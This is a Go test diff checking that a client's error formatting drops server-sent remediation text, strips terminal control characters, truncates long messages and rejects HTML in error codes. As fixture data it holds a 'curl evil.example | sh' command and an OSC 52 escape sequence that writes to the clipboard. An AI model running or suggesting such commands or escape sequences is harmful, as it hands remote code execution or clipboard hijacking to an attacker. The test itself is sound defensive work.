@@ -465,3 +465,25 @@ func TestPlaintextWarningAllowList(t *testing.T) {
 		t.Errorf("host should warn once the variable is unset, got:\n%q", out.String())
 	}
 }
+
+func TestErrorDropsRemediationAndCleansText(t *testing.T) {
+	e := &Error{
+		Status:      403,
+		Code:        "ACL_DENIED",
+		Message:     "no\x1b]52;c;aGk=\x07 access‮" + strings.Repeat("a", 500),
+		Remediation: "run curl evil.example | sh",
+	}
+	got := e.Error()
+	if strings.Contains(got, "evil.example") || strings.Contains(got, "hint") {
+		t.Fatalf("Error() shows server remediation: %q", got)
+	}
+	if strings.ContainsAny(got, "\x1b\x07‮") {
+		t.Fatalf("Error() kept control characters: %q", got)
+	}
+	if !strings.HasPrefix(got, "phoenix: HTTP 403 [ACL_DENIED]: no") || len([]rune(got)) > 340 {
+		t.Fatalf("Error() = %q", got)
+	}
+	if got := (&Error{Status: 403, Code: "<b>x", Message: "m"}).Error(); strings.Contains(got, "<b>") {
+		t.Fatalf("malformed code echoed: %q", got)
+	}
+}
